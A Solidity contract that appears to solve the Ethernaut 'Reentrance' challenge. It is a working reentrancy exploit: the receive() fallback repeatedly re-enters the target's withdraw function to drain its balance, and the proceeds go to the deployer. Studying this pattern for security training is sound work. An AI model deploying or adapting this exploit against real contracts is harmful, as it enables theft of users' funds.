// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IReentrance {
    function withdraw(uint _amount) external;
    function donate(address _to) external payable;
}

contract ReentranceAttack {
    IReentrance public ethernautInstance;
    uint256 public amount = 0.05 ether;
    address private owner;

    constructor(address instanceAddress) payable {
        owner = msg.sender;
        ethernautInstance = IReentrance(instanceAddress);
    }

    function attack() public payable {
        ethernautInstance.donate{value: amount}(address(this));
        ethernautInstance.withdraw(amount);
    }

    function withdrawFunds() public {
        (bool s, ) = owner.call{value: address(this).balance}("");
        require(s, "Failed to withdraw");
    }

    receive() external payable {
        uint256 amountToWithdraw = 
            amount < address(ethernautInstance).balance 
                ? amount 
                : address(ethernautInstance).balance;

        if (amountToWithdraw > 0){
            ethernautInstance.withdraw(amountToWithdraw);
        }
    }

}